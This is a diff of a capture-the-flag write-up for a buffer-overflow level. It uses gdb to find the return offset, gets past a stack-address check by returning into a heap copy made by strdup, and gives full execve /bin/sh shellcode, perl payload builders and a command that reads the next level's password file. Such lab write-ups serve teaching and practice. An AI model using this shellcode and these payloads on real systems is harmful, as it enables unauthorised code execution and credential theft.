@@ -1,46 +1,96 @@
-0xFF FF D0 8C   # Stack
+First we tried to use a shell-code and modify the return address to the beginning of the buffer (in the stack) :
 
-perl -e 'print "A"x76 . "\x8C\xD0\xFF\xFF"' > test_payload
+  gdb> pattern_create 100
+  quelquechosedelongetincomprehensible...
+  gdb> r < <(echo 'cettememechoselonguetincomprehensible...')
+  gdb> pattern_search
+  Registers contain pattern buffer:
+  EIP+0 found at offset: 80
+  EBP+0 found at offset: 76
+  ...
+  ### USEFULL LATER
+  Pattern buffer found at:
+  0x0804a04b : offset   67 - size   33 ([heap])
+  ###
+  ...
 
+But after a few hours of trying, We found out that the return pointer is (very lightly) checked :
 
+  gdb> disas p
+    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+    0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]  |
+    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax  |
+    0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]  |
+    0x080484fb <+39>:	and    eax,0xb0000000           | 
+    0x08048500 <+44>:	cmp    eax,0xb0000000           # Compares on-the-stack $eip with 0xb-------
+    0x08048505 <+49>:	jne    0x8048527 <p+83>
+  
+We tried many things (which we'll not detail here)
+  - Return to libc (could work, can't make it work)
+  - Use main's return address instead of p's return address
 
-0x08 04 85 3F      # Main
+Finally we noticed that the buffer is moved on the head :
 
-perl -e 'print "A"x76 . "\x3F\x85\x04\x08"' > test_payload
+  gdb> pattern_search
+  ...
+  Pattern buffer found at:
+    0x0804a04b : offset   67 - size   33 ([heap])
+  ...
+  gdb> disas p
+    0x08048535 <+97>:	mov    DWORD PTR [esp],eax
+    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
 
-Shellcode :
+The nice thing about that is that the address returned by strdup passes trough the filter :
 
-   0:	31 c0                	xor    eax,eax
-   2:	50                   	push   eax
-   3:	68 2f 2f 73 68       	push   0x68732f2f
-   8:	68 2f 62 69 6e       	push   0x6e69622f
-   d:	89 e3                	mov    ebx,esp
-   f:	50                   	push   eax
-  10:	89 e2                	mov    edx,esp
-  12:	53                   	push   ebx
-  13:	89 e1                	mov    ecx,esp
-  15:	b0 0b                	mov    al,0xb
-  17:	cd 80                	int    0x80
+  gdb> b *0x08048538
+  gdb> set step-mode on
+  gdb> r < dummy_payload
+  gdb> n
+  (peda auto register infos :)
+  EAX: 0x804a008 ('D' <repeats 64 times>, "J\205\004\bDDDDDDDD")
 
-"31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+Found a shellcode on wikipedia :
 
-address: 0xff ff d0 a0
+  00000000  EB1F              jmp short 0x21
+  00000002  5E                pop esi
+  00000003  897608            mov [esi+0x8],esi
+  00000006  31C0              xor eax,eax
+  00000008  884607            mov [esi+0x7],al
+  0000000B  89460C            mov [esi+0xc],eax
+  0000000E  B00B              mov al,0xb
+  00000010  89F3              mov ebx,esi
+  00000012  8D4E08            lea ecx,[esi+0x8]
+  00000015  8D560C            lea edx,[esi+0xc]
+  00000018  CD80              int 0x80
+  0000001A  31DB              xor ebx,ebx
+  0000001C  89D8              mov eax,ebx
+  0000001E  40                inc eax
+  0000001F  CD80              int 0x80
+  00000021  E8DCFFFFFF        call 0x2
+  00000026  2F                das
+  00000027  62696E            bound ebp,[ecx+0x6e]
+  0000002A  2F                das
+  0000002B  7368              jnc 0x95
 
-[40 nop slide][25 Shellcode][A * 11][address in nop slide]
+Compiled version :
 
-perl -e 'print "\x90"x40 .
-    "31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" .
-    "A"x10 .
-    "\x90\xD0\xFF\xFF"' > test_payload
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
+Payload :
 
+  [shell-code: 45 bytes][dummy-letters: 35][return-address: 4 bytes]
 
-ret:      0x0804854b
-/bin/sh:  0xffffd82a
-system:   0xf7deca60
+  perl -e 'print
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+  . "D"x35
+  . "\x08\xa0\x04\x08"
+  ' > /tmp/payload
 
-final ret:    0x0804854b
-final bin/sh: 0xbffff927
-final system: 0xb7e6b060
+Running the code :
 
-perl -e 'print "\x27\xf9\xff\xbf"x20 . "\x4b\x85\x04\x08\x60\xb0\xe6\xb7"' > /tmp/payload
+  > cat /tmp/payload - | ./level2
+  [press enter]
+  blablablabla
+
+  cat /home/user/level3/.pass
+  OUR_FLAG
